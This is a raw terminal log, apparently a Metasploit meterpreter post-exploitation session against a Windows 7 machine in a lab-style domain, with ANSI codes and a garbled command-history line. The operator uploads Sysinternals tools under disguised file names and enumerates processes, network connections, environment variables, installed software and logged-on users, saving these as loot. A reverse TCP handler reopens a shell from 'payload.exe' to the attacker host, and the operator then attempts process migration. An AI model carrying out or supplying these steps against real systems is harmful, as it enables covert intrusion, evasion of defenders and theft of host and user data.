+[1m[34m[*][0m Rechecking for solution: 0
+[1m[34m[*][0m Report Id: a06cdcec-5824-11e9-b184-1e145a794668
+[1m[34m[*][0m Report Status: 0
+[1m[34m[*][0m 
+[1m[34m[*][0m [3521] Application Error
+[1m[34m[*][0m    Type:     ERROR 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:55 PM   ID:       1000 
+[1m[34m[*][0m Faulting application name: payload.exe, version: 0.0.0.0, time stamp: 0x4bc63c7d
+[1m[34m[*][0m Faulting module name: unknown, version: 0.0.0.0, time stamp: 0x00000000
+[1m[34m[*][0m Exception code: 0xc0000005
+[1m[34m[*][0m Fault offset: 0x0000000000358692
+[1m[34m[*][0m Faulting process id: 0x12cc
+[1m[34m[*][0m Faulting application start time: 0x01d4ec2fd8c0258f
+[1m[34m[*][0m Faulting application path: C:\payload.exe
+[1m[34m[*][0m Faulting module path: unknown
+[1m[34m[*][0m Report Id: a06cdcec-5824-11e9-b184-1e145a794668
+[1m[34m[*][0m 
+[4mmeterpreter[0m > run multicommand -cl "cmd /c wsupdt.exe -m 10 system"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c wsupdt.exe -m 10 system
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c wsupdt.exe -m 10 system
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m PsLoglist v2.81 - local and remote event log viewer
+[1m[34m[*][0m Copyright (C) 2000-2019 Mark Russinovich
+[1m[34m[*][0m Sysinternals - www.sysinternals.com
+[1m[34m[*][0m 
+[1m[34m[*][0m System log on \\SBWIN7:
+[1m[34m[*][0m [21350] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:31:55 PM   ID:       7036 
+[1m[34m[*][0m The Windows Error Reporting Service service entered the stopped state.
+[1m[34m[*][0m 
+[1m[34m[*][0m [21349] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:31:19 PM   ID:       7036 
+[1m[34m[*][0m The Application Experience service entered the running state.
+[1m[34m[*][0m 
+[1m[34m[*][0m [21348] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:54 PM   ID:       7036 
+[1m[34m[*][0m The Windows Error Reporting Service service entered the running state.
+[1m[34m[*][0m 
+[1m[34m[*][0m [21347] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:29:01 PM   ID:       7036 
+[1m[34m[*][0m The Multimedia Class Scheduler service entered the running state.
+[1m[34m[*][0m 
+[1m[34m[*][0m [21346] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:28:54 PM   ID:       7036 
+[1m[34m[*][0m The Application Experience service entered the stopped state.
+[1m[34m[*][0m 
+[1m[34m[*][0m [21345] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:24:06 PM   ID:       7036 
+[1m[34m[*][0m The Windows Modules Installer service entered the running state.
+[1m[34m[*][0m 
+[1m[34m[*][0m [21344] Service Control Manager
+[1m[34m[*][0m    Type:     INFORMATION 
+[1m[34m[*][0m    Computer: SBWin7.starwars.home
+[1m[34m[*][0m    Time:     4/5/2019 9:23:52 PM   ID:       7036 
+[1m[34m[*][0m The Multimedia Class Scheduler service entered the stopped state.
+[1m[34m[*][0m 
+[4mmeterpreter[0m > localtime
+[0mLocal Date/Time: 2019-04-05 21:32:54.999 Pacific Daylight Time (UTC-800)
+[4mmeterpreter[0m > upload "/tools/utilities/sysinternals/Listdlls.exe" "c:/windows/temp/sockapi64.exe"
+[0m[1m[34m[*][0m uploading  : /tools/utilities/sysinternals/Listdlls.exe -> c:/windows/temp/sockapi64.exe
+[1m[34m[*][0m Uploaded 414.16 KiB of 414.16 KiB (100.0%): /tools/utilities/sysinternals/Listdlls.exe -> c:/windows/temp/sockapi64.exe
+[1m[34m[*][0m uploaded   : /tools/utilities/sysinternals/Listdlls.exe -> c:/windows/temp/sockapi64.exe
+[4mmeterpreter[0m > run multicommand -cl "cmd /c sockapi64.exe -h /accepteula"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c sockapi64.exe -h /accepteula
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c sockapi64.exe -h /accepteula
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m Listdlls v3.2 - Listdlls
+[1m[34m[*][0m Copyright (C) 1997-2016 Mark Russinovich
+[1m[34m[*][0m Sysinternals
+[1m[34m[*][0m 
+[1m[34m[*][0m usage: listdlls [-r] [-v | -u] [processname|pid]
+[1m[34m[*][0m usage: listdlls [-r] [-v] [-d dllname]
+[1m[34m[*][0m   processname   Dump DLLs loaded by process (partial name accepted)
+[1m[34m[*][0m   pid           Dump DLLs associated with the specified process id
+[1m[34m[*][0m   dllname       Show only processes that have loaded the specified DLL.
+[1m[34m[*][0m   -r            Flag DLLs that relocated because they are not loaded at
+[1m[34m[*][0m                 their base address.
+[1m[34m[*][0m   -u            Only list unsigned DLLs.
+[1m[34m[*][0m   -v            Show DLL version information.
+[4mmeterpreter[0m > run multicommand -cl "cmd /c sockapi64.exe| findstr \"Command line\""
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command cmd /c sockapi64.exe| findstr "Command line"
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of cmd /c sockapi64.exe| findstr "Command line"
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m Command line: \SystemRoot\System32\smss.exe
+[1m[34m[*][0m Command line: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+[1m[34m[*][0m Command line: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+[1m[34m[*][0m Command line: wininit.exe
+[1m[34m[*][0m Command line: winlogon.exe
+[1m[34m[*][0m Command line: C:\Windows\system32\services.exe
+[1m[34m[*][0m Command line: C:\Windows\system32\lsass.exe
+[1m[34m[*][0m Command line: C:\Windows\system32\lsm.exe
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k DcomLaunch
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k RPCSS
+[1m[34m[*][0m Command line: "LogonUI.exe" /flags:0x0
+[1m[34m[*][0m Command line: C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
+[1m[34m[*][0m Command line: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k netsvcs
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k LocalService
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k NetworkService
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted
+[1m[34m[*][0m Command line: C:\Windows\System32\spoolsv.exe
+[1m[34m[*][0m Command line: "C:\Program Files\Windows Media Player\wmpnetwk.exe"
+[1m[34m[*][0m Command line: C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
+[1m[34m[*][0m Command line: C:\Windows\system32\SearchIndexer.exe /Embedding
+[1m[34m[*][0m Command line: "C:\Program Files (x86)\Microsoft\BingBar\7.1.355.0\SeaPort.exe"
+[1m[34m[*][0m Command line: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+[1m[34m[*][0m Command line: winlogon.exe
+[1m[34m[*][0m Command line: "taskhost.exe"
+[1m[34m[*][0m Command line: rdpclip
+[1m[34m[*][0m Command line: "C:\Windows\system32\Dwm.exe"
+[1m[34m[*][0m Command line: C:\Windows\Explorer.EXE
+[1m[34m[*][0m Command line: "C:\Program Files (x86)\HP\HP Software Update\hpwuschd2.exe" 
+[1m[34m[*][0m Command line: "C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler.exe"
+[1m[34m[*][0m Command line: "C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler64.exe"
+[1m[34m[*][0m Command line: "C:\Program Files\winlogbeat\winlogbeat.exe" -c "C:\Program Files\winlogbeat\winlogbeat.yml" -path.home "C:\Program Files\winlogbeat" -path.data "C:\ProgramData\winlogbeat" -path.logs "C:\ProgramData\winlogbeat\logs"
+[1m[34m[*][0m Command line: "C:\Program Files\AVG\Antivirus\AVGSvc.exe"
+[1m[34m[*][0m Command line: "C:\Program Files\AVG\Antivirus\AVGUI.exe" /welcome
+[1m[34m[*][0m Command line: "C:\Program Files\AVG\Antivirus\aswidsagent.exe"
+[1m[34m[*][0m Command line: C:\Windows\system32\wbem\unsecapp.exe -Embedding
+[1m[34m[*][0m Command line: C:\Windows\servicing\TrustedInstaller.exe
+[1m[34m[*][0m Command line: "C:\payload.exe" 
+[1m[34m[*][0m Command line: cmd /c sockapi64.exe| findstr "Command line"
+[1m[34m[*][0m Command line: \??\C:\Windows\system32\conhost.exe
+[1m[34m[*][0m Command line: sockapi64.exe
+[1m[34m[*][0m Command line: findstr  "Command line"
+[1m[34m[*][0m Command line: sockapi64.exe
+[4mmeterpreter[0m > netstat
+[0m
+Connection list
+===============
+
+    Proto  Local address                    Remote address      State        User  Inode  PID/Program name
+    -----  -------------                    --------------      -----        ----  -----  ----------------
+    tcp    0.0.0.0:135                      0.0.0.0:*           LISTEN       0     0      648/svchost.exe
+    tcp    0.0.0.0:445                      0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    0.0.0.0:554                      0.0.0.0:*           LISTEN       0     0      1268/wmpnetwk.exe
+    tcp    0.0.0.0:2869                     0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    0.0.0.0:3389                     0.0.0.0:*           LISTEN       0     0      960/svchost.exe
+    tcp    0.0.0.0:5985                     0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    0.0.0.0:10243                    0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    0.0.0.0:27275                    0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    0.0.0.0:47001                    0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    0.0.0.0:49152                    0.0.0.0:*           LISTEN       0     0      380/wininit.exe
+    tcp    0.0.0.0:49153                    0.0.0.0:*           LISTEN       0     0      848/svchost.exe
+    tcp    0.0.0.0:49154                    0.0.0.0:*           LISTEN       0     0      476/lsass.exe
+    tcp    0.0.0.0:49155                    0.0.0.0:*           LISTEN       0     0      908/svchost.exe
+    tcp    0.0.0.0:49173                    0.0.0.0:*           LISTEN       0     0      468/services.exe
+    tcp    0.0.0.0:49200                    0.0.0.0:*           LISTEN       0     0      1968/spoolsv.exe
+    tcp    10.10.100.77:139                 0.0.0.0:*           LISTEN       0     0      4/System
+    tcp    10.10.100.77:3389                192.168.1.11:61801  ESTABLISHED  0     0      960/svchost.exe
+    tcp    10.10.100.77:56487               10.10.100.8:139     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56488               10.10.100.8:139     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56489               10.10.100.8:139     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56490               77.234.42.55:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56491               24.96.54.48:80      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56492               24.96.54.48:80      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56493               77.234.42.88:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56494               77.234.42.84:80     TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56495               5.62.38.154:80      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:56496               5.62.38.157:80      TIME_WAIT    0     0      0/[System Process]
+    tcp    10.10.100.77:57230               77.234.42.247:80    ESTABLISHED  0     0      3604/AVGSvc.exe
+    tcp    10.10.100.77:57806               10.10.20.151:15091  ESTABLISHED  0     0      4692/payload.exe
+    tcp    127.0.0.1:12025                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12110                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12119                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12143                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12465                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12563                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12993                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:12995                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp    127.0.0.1:27275                  0.0.0.0:*           LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   :::135                           :::*                LISTEN       0     0      648/svchost.exe
+    tcp6   :::445                           :::*                LISTEN       0     0      4/System
+    tcp6   :::554                           :::*                LISTEN       0     0      1268/wmpnetwk.exe
+    tcp6   :::2869                          :::*                LISTEN       0     0      4/System
+    tcp6   :::3389                          :::*                LISTEN       0     0      960/svchost.exe
+    tcp6   :::5985                          :::*                LISTEN       0     0      4/System
+    tcp6   :::10243                         :::*                LISTEN       0     0      4/System
+    tcp6   :::47001                         :::*                LISTEN       0     0      4/System
+    tcp6   :::49152                         :::*                LISTEN       0     0      380/wininit.exe
+    tcp6   :::49153                         :::*                LISTEN       0     0      848/svchost.exe
+    tcp6   :::49154                         :::*                LISTEN       0     0      476/lsass.exe
+    tcp6   :::49155                         :::*                LISTEN       0     0      908/svchost.exe
+    tcp6   :::49173                         :::*                LISTEN       0     0      468/services.exe
+    tcp6   :::49200                         :::*                LISTEN       0     0      1968/spoolsv.exe
+    tcp6   ::1:12025                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12110                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12119                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12143                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12465                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12563                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12993                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:12995                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    tcp6   ::1:27275                        :::*                LISTEN       0     0      3604/AVGSvc.exe
+    udp    0.0.0.0:123                      0.0.0.0:*                        0     0      288/svchost.exe
+    udp    0.0.0.0:500                      0.0.0.0:*                        0     0      908/svchost.exe
+    udp    0.0.0.0:4500                     0.0.0.0:*                        0     0      908/svchost.exe
+    udp    0.0.0.0:5004                     0.0.0.0:*                        0     0      1268/wmpnetwk.exe
+    udp    0.0.0.0:5005                     0.0.0.0:*                        0     0      1268/wmpnetwk.exe
+    udp    0.0.0.0:5355                     0.0.0.0:*                        0     0      960/svchost.exe
+    udp    10.10.100.77:137                 0.0.0.0:*                        0     0      4/System
+    udp    10.10.100.77:138                 0.0.0.0:*                        0     0      4/System
+    udp    10.10.100.77:1900                0.0.0.0:*                        0     0      1580/svchost.exe
+    udp    10.10.100.77:57852               0.0.0.0:*                        0     0      1580/svchost.exe
+    udp    127.0.0.1:1900                   0.0.0.0:*                        0     0      1580/svchost.exe
+    udp    127.0.0.1:49989                  0.0.0.0:*                        0     0      960/svchost.exe
+    udp    127.0.0.1:49991                  0.0.0.0:*                        0     0      476/lsass.exe
+    udp    127.0.0.1:53718                  0.0.0.0:*                        0     0      908/svchost.exe
+    udp    127.0.0.1:57853                  0.0.0.0:*                        0     0      1580/svchost.exe
+    udp    127.0.0.1:57854                  0.0.0.0:*                        0     0      1968/spoolsv.exe
+    udp6   :::123                           :::*                             0     0      288/svchost.exe
+    udp6   :::500                           :::*                             0     0      908/svchost.exe
+    udp6   :::4500                          :::*                             0     0      908/svchost.exe
+    udp6   :::5004                          :::*                             0     0      1268/wmpnetwk.exe
+    udp6   :::5005                          :::*                             0     0      1268/wmpnetwk.exe
+    udp6   :::5355                          :::*                             0     0      960/svchost.exe
+    udp6   ::1:1900                         :::*                             0     0      1580/svchost.exe
+    udp6   ::1:57851                        :::*                             0     0      1580/svchost.exe
+    udp6   fe80::c1b8:c491:905d:a392:1900   :::*                             0     0      1580/svchost.exe
+    udp6   fe80::c1b8:c491:905d:a392:57850  :::*                             0     0      1580/svchost.exe
+
+[4mmeterpreter[0m > run post/multi/gather/env
+[0m
+APPDATA=C:\Users\administrator\AppData\Roaming
+ComSpec=C:\Windows\system32\cmd.exe
+FP_NO_HOST_CHECK=NO
+HOMEDRIVE=C:
+HOMEPATH=\Users\administrator
+LOCALAPPDATA=C:\Users\administrator\AppData\Local
+LOGONSERVER=\\WIN2K8DC
+NUMBER_OF_PROCESSORS=1
+OS=Windows_NT
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+PROCESSOR_ARCHITECTURE=AMD64
+PROCESSOR_IDENTIFIER=Intel64 Family 15 Model 6 Stepping 1, GenuineIntel
+PROCESSOR_LEVEL=15
+PROCESSOR_REVISION=0601
+PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+TEMP=C:\Users\ADMINI~1\AppData\Local\Temp
+TMP=C:\Users\ADMINI~1\AppData\Local\Temp
+USERDNSDOMAIN=STARWARS.HOME
+USERDOMAIN=STARWARS
+USERNAME=administrator
+USERPROFILE=C:\Users\administrator
+windir=C:\Windows
+[4mmeterpreter[0m > run post/windows/gather/enum_applications
+[0m
+[1m[34m[*][0m Enumerating applications installed on SBWIN7
+
+Installed Applications
+======================
+
+ Name                                                            Version
+ ----                                                            -------
+ 7-Zip 9.20 (x64 edition)                                        9.20.00.0
+ AVG AntiVirus FREE                                              19.3.3084
+ Bing Bar                                                        7.1.355.0
+ ConEmu 140814.x64                                               11.140.8140
+ Google Chrome                                                   73.0.3683.86
+ Google Update Helper                                            1.3.34.7
+ HP Deskjet 1000 J110 series Basic Device Software               28.0.1313.0
+ HP Deskjet 1000 J110 series Help                                140.0.65.65
+ HP Deskjet 1000 J110 series Product Improvement Study           28.0.1313.0
+ HP Photo Creations                                              1.0.0.9572
+ HP Update                                                       5.005.002.002
+ Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  9.0.30729.6161
+ Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148
+ Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219     10.0.40219
+ Mozilla Firefox 28.0 (x86 en-US)                                28.0
+ Mozilla Maintenance Service                                     28.0
+ Notepad++                                                       6.5.5
+ SumatraPDF                                                      2.4
+ VMware Tools                                                    9.2.3.21136
+ WinRAR 5.01 (32-bit)                                            5.01.0
+
+
+[1m[32m[+][0m Results stored in: /root/.msf4/loot/20190408103318_default_10.10.100.77_host.application_158178.txt
+[4mmeterpreter[0m > run post/windows/gather/enum_logged_on_users
+[0m
+[1m[34m[*][0m Running against session 2
+
+Current Logged Users
+====================
+
+ SID                                             User
+ ---                                             ----
+ S-1-5-21-1132284841-2818260946-2881263294-1108  STARWARS\luke
+ S-1-5-21-1132284841-2818260946-2881263294-500   STARWARS\administrator
+ S-1-5-21-3241095704-3712984886-4241050855-1001  SBWIN7\root
+
+
+[1m[32m[+][0m Results saved in: /root/.msf4/loot/20190408103337_default_10.10.100.77_host.users.activ_939447.txt
+
+Recently Logged Users
+=====================
+
+ SID                                             Profile Path
+ ---                                             ------------
+ S-1-5-18                                        %systemroot%\system32\config\systemprofile 
+ S-1-5-19                                        C:\Windows\ServiceProfiles\LocalService 
+ S-1-5-20                                        C:\Windows\ServiceProfiles\NetworkService 
+ S-1-5-21-1132284841-2818260946-2881263294-1108  C:\Users\luke 
+ S-1-5-21-1132284841-2818260946-2881263294-500   C:\Users\administrator 
+ S-1-5-21-3241095704-3712984886-4241050855-1001  C:\Users\root 
+
+
+[4mmeterpreter[0m > idle
+[0m[1m[31m[-][0m Unknown command: idle.
+[4mmeterpreter[0m > idletime 
+[0mUser has been idle for: 3 mins 20 secs
+[4mmeterpreter[0m > load powershell
+[0mLoading extension powershell...
+[1m[31m[-][0m Failed to load extension: No response was received to the core_loadlib request.
+[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 2 closed.  Reason: Died
+
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> load powershell[P[P[P[P[P[Pidletime [Krun post/windows/gather/enum_logged_on_users[P[P[Papplications[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pmulti/gather/envnetstat[Krun multicommand -cl "cmd /c sockapi64.exe| findstr \"Command line\""[P[P[P[P[P[P[P[P[P[P[P -h /accepteula"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cupload "/tools/utilities/sysinternals/Listdlls.exe" "c:/windows/temp/sockapi64.exe"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Clocaltime[Krun multicommand -cl "cmd /c wsupdt.exe -m 10 system"application"[P[P[Psecurity"h /accepteula"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Pcd c:\windows\\tempupload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Crun[Kupload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Crun[K
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:15091 
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 3 opened (10.10.20.151:15091 -> 10.10.100.77:56502) at 2019-04-08 10:37:31 -0400
+[0m[0m
+[0m[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                      Arch  Session  User                          Path
+ ---   ----  ----                      ----  -------  ----                          ----
+ 0     0     [System Process]                                                       
+ 4     0     System                    x64   0                                      
+ 252   4     smss.exe                  x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 288   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 316   468   SeaPort.EXE               x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Microsoft\BingBar\7.1.355.0\SeaPort.exe
+ 324   316   csrss.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 372   364   csrss.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 380   316   wininit.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 408   364   winlogon.exe              x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 468   380   services.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 476   380   lsass.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 484   380   lsm.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 576   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 648   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 724   408   LogonUI.exe               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 740   936   winlogon.exe              x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 848   468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 884   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 908   468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 960   468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1092  936   csrss.exe                 x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 1100  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1268  468   wmpnetwk.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
+ 1440  468   SearchIndexer.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 1580  468   svchost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1660  468   svchost.exe               x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1968  468   spoolsv.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 2080  468   taskhost.exe              x64   2        STARWARS\administrator        C:\Windows\system32\taskhost.exe
+ 2284  960   rdpclip.exe               x64   2        STARWARS\administrator        C:\Windows\system32\rdpclip.exe
+ 2368  2936  GoogleCrashHandler64.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler64.exe
+ 2408  2936  GoogleCrashHandler.exe    x86   0        NT AUTHORITY\SYSTEM           C:\Program Files (x86)\Google\Update\1.3.34.7\GoogleCrashHandler.exe
+ 2420  884   dwm.exe                   x64   2        STARWARS\administrator        C:\Windows\system32\Dwm.exe
+ 2508  2400  explorer.exe              x64   2        STARWARS\administrator        C:\Windows\Explorer.EXE
+ 2764  2696  hpwuschd2.exe             x86   2        STARWARS\administrator        C:\Program Files (x86)\HP\HP Software Update\hpwuschd2.exe
+ 3408  848   audiodg.exe               x64   0                                      
+ 3588  468   svchost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3604  468   AVGSvc.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\AVGSvc.exe
+ 3684  468   winlogbeat.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\winlogbeat\winlogbeat.exe
+ 3744  3960  ctfmon.exe                x64   2        STARWARS\administrator        C:\Windows\system32\ctfmon.exe
+ 3960  2508  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 5384  2508  payload.exe               x64   2        STARWARS\administrator        C:\payload.exe
+ 5568  468   aswidsagent.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\AVG\Antivirus\aswidsagent.exe
+ 5648  3960  AVGUI.exe                 x64   2        STARWARS\administrator        C:\Program Files\AVG\Antivirus\AVGUI.exe
+ 5828  576   unsecapp.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\unsecapp.exe
+
+[4mmeterpreter[0m > migrate 1968
+[0m[1m[34m[*][0m Migrating from 5384 to 1968...
+[1m[31m[-][0m Error running command migrate: Rex::TimeoutError Operation timed out.
+[4mmeterpreter[0m > migrate 908
+[0m[1m[31m[-][0m Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
+[4mmeterpreter[0m > migrate -h
+[0mUsage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]
+
+Migrates the server instance to another process.
+NOTE: Any open channels or other dynamic state will be lost.
+
+[4mmeterpreter[0m > migrate -h[KP 908
+[0m[1m[31m[-][0m Error running command migrate: NoMethodError undefined method `pid' for nil:NilClass
+[4mmeterpreter[0m > getpid[K[K[Kuid
